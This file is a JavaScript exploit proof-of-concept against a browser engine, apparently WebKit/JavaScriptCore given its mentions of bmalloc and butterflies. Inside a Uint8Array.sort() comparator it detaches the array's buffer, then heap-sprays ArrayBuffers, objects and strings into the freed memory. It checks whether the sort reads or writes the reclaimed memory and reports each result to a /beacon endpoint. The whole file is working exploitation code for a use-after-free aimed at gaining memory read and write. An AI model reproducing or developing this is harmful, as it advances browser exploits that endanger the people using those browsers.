/*
 * p422 -- Uint8Array sort UAF with heap spray
 *
 * V421 confirmed: Uint8Array.sort() doesn't throw after detach (1024 calls ok).
 * Float64Array.sort() DOES throw (caught at 2304 calls).
 *
 * Strategy:
 * 1. Create Uint8Array over 4KB AB (4096 elements)
 * 2. sort(compareFn): detach at call 10
 * 3. At call 11+: spray 4KB ABs into freed region
 * 4. Collect all (a,b) from compareFn -- bytes from sprayed objects
 * 5. Also try: spray JSObjects to get header bytes
 *
 * Beacon prefix: V422-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V422-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// Test A: Spray with marked ArrayBuffers during sort
// ================================================================

function testA() {
  B("A-START");

  // Fill holes
  var fillers = [];
  for (var i = 0; i < 64; i++) fillers.push(new ArrayBuffer(4096));

  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  // Fill with descending
  for (var i = 0; i < 4096; i++) u8[i] = 255 - (i & 0xFF);

  var callCount = 0;
  var detached = false;
  var sprayed = false;
  var sprayABs = [];

  // Collect byte values from post-detach comparisons
  var postDetachValues = [];
  var DETACH_AT = 10;

  try {
    u8.sort(function(a, b) {
      callCount++;

      if (callCount === DETACH_AT && !detached) {
        try {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
        } catch(e) {
          B("A-DETACH-ERR", e.message.slice(0, 40));
        }
      }

      // Spray at call 11
      if (callCount === DETACH_AT + 1 && detached && !sprayed) {
        // Spray same-size (4KB) ABs with marker pattern
        for (var k = 0; k < 128; k++) {
          var sab = new ArrayBuffer(4096);
          var sv = new Uint8Array(sab);
          // Fill with recognizable byte pattern: 0xDE for each AB
          for (var j = 0; j < 4096; j++) {
            sv[j] = 0xDE;
          }
          sprayABs.push(sab);
        }
        sprayed = true;
      }

      // Collect post-detach + post-spray values
      if (detached && sprayed && postDetachValues.length < 2000) {
        postDetachValues.push(a);
        postDetachValues.push(b);
      }

      return a - b;
    });
  } catch(e) {
    B("A-SORT-ERR", e.message.slice(0, 60));
  }

  B("A-STATS", {calls: callCount, detached: detached, sprayed: sprayed, vals: postDetachValues.length});

  // Analyze: how many 0xDE (222) bytes did we see?
  var deCnt = 0;
  var zeroCnt = 0;
  var origCnt = 0;
  var otherCnt = 0;
  var histogram = {};

  for (var i = 0; i < postDetachValues.length; i++) {
    var v = postDetachValues[i];
    histogram[v] = (histogram[v] || 0) + 1;
    if (v === 0xDE) deCnt++;
    else if (v === 0) zeroCnt++;
    else otherCnt++;
  }

  B("A-DE", {count: deCnt, pct: Math.round(deCnt*100/postDetachValues.length)});
  B("A-ZERO", {count: zeroCnt});
  B("A-OTHER", {count: otherCnt});

  // Top 10 most frequent values
  var sorted = Object.keys(histogram).sort(function(a,b) { return histogram[b] - histogram[a]; });
  var top10 = sorted.slice(0, 15).map(function(k) { return {v: parseInt(k), n: histogram[k]}; });
  B("A-TOP", top10);

  // Check if spray ABs were corrupted by sort write-back
  var sprayHit = -1;
  for (var i = 0; i < sprayABs.length; i++) {
    var sv = new Uint8Array(sprayABs[i]);
    for (var j = 0; j < 16; j++) {
      if (sv[j] !== 0xDE) {
        sprayHit = i;
        B("A-HIT", {ab: i, off: j, got: sv[j]});
        // Dump first 32 bytes of corrupted spray AB
        var hex = "";
        for (var h = 0; h < 32; h++) hex += sv[h].toString(16).padStart(2, "0");
        B("A-HIT-HEX", hex);
        break;
      }
    }
    if (sprayHit >= 0) break;
  }

  if (sprayHit < 0) {
    B("A-NO-HIT", "no spray AB corrupted by sort");
  }
}

// ================================================================
// Test B: Spray with JSObjects + strings (different data patterns)
// ================================================================

function testB() {
  B("B-START");

  var fillers = [];
  for (var i = 0; i < 64; i++) fillers.push(new ArrayBuffer(4096));

  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = i & 0xFF;

  var callCount = 0;
  var detached = false;
  var sprayed = false;
  var sprayObjs = [];
  var postVals = [];

  try {
    u8.sort(function(a, b) {
      callCount++;

      if (callCount === 10 && !detached) {
        try {
          structuredClone(ab, {transfer: [ab]});
          detached = true;
        } catch(e) {}
      }

      if (callCount === 11 && detached && !sprayed) {
        // Spray JSObjects with butterfly properties
        // Their butterflies might land in the freed 4KB region
        for (var k = 0; k < 256; k++) {
          var o = {};
          // Add many properties to force butterfly allocation
          o.p0 = 0x41414141;
          o.p1 = 0x42424242;
          o.p2 = 0x43434343;
          o.p3 = 0x44444444;
          o.p4 = 0x45454545;
          o.p5 = 0x46464646;
          o.p6 = 0x47474747;
          o.p7 = 0x48484848;
          sprayObjs.push(o);
        }

        // Also spray strings (StringImpl has distinctive header)
        for (var k = 0; k < 128; k++) {
          sprayObjs.push("AAAA" + String.fromCharCode(65 + (k & 63)).repeat(100));
        }

        sprayed = true;
      }

      if (detached && sprayed && postVals.length < 2000) {
        postVals.push(a);
        postVals.push(b);
      }

      return a - b;
    });
  } catch(e) {
    B("B-SORT-ERR", e.message.slice(0, 60));
  }

  B("B-STATS", {calls: callCount, vals: postVals.length});

  // Look for 0x41-0x48 bytes (our property values) in compareFn output
  var propHits = 0;
  var histogram = {};
  for (var i = 0; i < postVals.length; i++) {
    var v = postVals[i];
    histogram[v] = (histogram[v] || 0) + 1;
    if (v >= 0x41 && v <= 0x48) propHits++;
  }

  B("B-PROPHITS", propHits);

  var sorted = Object.keys(histogram).sort(function(a,b) { return histogram[b] - histogram[a]; });
  var top15 = sorted.slice(0, 15).map(function(k) { return {v: parseInt(k), n: histogram[k]}; });
  B("B-TOP", top15);
}

// ================================================================
// Test C: Free-and-realloc -- free the 4KB, immediately allocate
// a new 4KB AB, check if it lands at the same address
// ================================================================

function testC() {
  B("C-START");

  var ab = new ArrayBuffer(4096);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 4096; i++) u8[i] = 0xAA;

  var callCount = 0;
  var detached = false;
  var replacementAB = null;
  var replacementView = null;
  var readFromSort = [];
  var DETACH_AT = 5;

  try {
    u8.sort(function(a, b) {
      callCount++;

      if (callCount === DETACH_AT && !detached) {
        structuredClone(ab, {transfer: [ab]});
        detached = true;

        // Immediately allocate a new 4KB AB
        // If bmalloc reuses the freed slot, this AB's data is at the same address
        replacementAB = new ArrayBuffer(4096);
        replacementView = new Uint8Array(replacementAB);

        // Fill with distinctive pattern
        for (var j = 0; j < 4096; j++) {
          replacementView[j] = 0x42; // 'B'
        }

        B("C-REPLACED");
      }

      if (detached && readFromSort.length < 1000) {
        readFromSort.push(a);
        readFromSort.push(b);
      }

      return a - b;
    });
  } catch(e) {
    B("C-SORT-ERR", e.message.slice(0, 60));
  }

  B("C-STATS", {calls: callCount, vals: readFromSort.length});

  // Count 0x42 bytes -- if we see them, the replacement landed at the same address!
  var cnt42 = 0;
  var cntAA = 0;
  var cntOther = 0;
  for (var i = 0; i < readFromSort.length; i++) {
    if (readFromSort[i] === 0x42) cnt42++;
    else if (readFromSort[i] === 0xAA) cntAA++;
    else cntOther++;
  }

  B("C-42", {count: cnt42, pct: Math.round(cnt42 * 100 / readFromSort.length)});
  B("C-AA", {count: cntAA});
  B("C-OTHER", {count: cntOther});

  if (cnt42 > 0) {
    B("C-REUSE-CONFIRMED", "replacement AB landed at same address!");

    // Now check: did sort corrupt the replacement AB?
    var replacementCorrupted = 0;
    if (replacementView) {
      for (var j = 0; j < 4096; j++) {
        if (replacementView[j] !== 0x42) {
          replacementCorrupted++;
        }
      }
    }
    B("C-RCORRUPT", {count: replacementCorrupted, total: 4096});

    // If sort corrupted the replacement, we have WRITE to a new AB!
    if (replacementCorrupted > 0) {
      B("C-WRITE-CONFIRMED", "sort wrote to replacement AB!");
      // Dump first 64 bytes
      var hex = "";
      for (var j = 0; j < 64; j++) {
        hex += replacementView[j].toString(16).padStart(2, "0");
      }
      B("C-DUMP", hex);
    }
  }
}

testA();
testB();
testC();

B("DONE");
})();
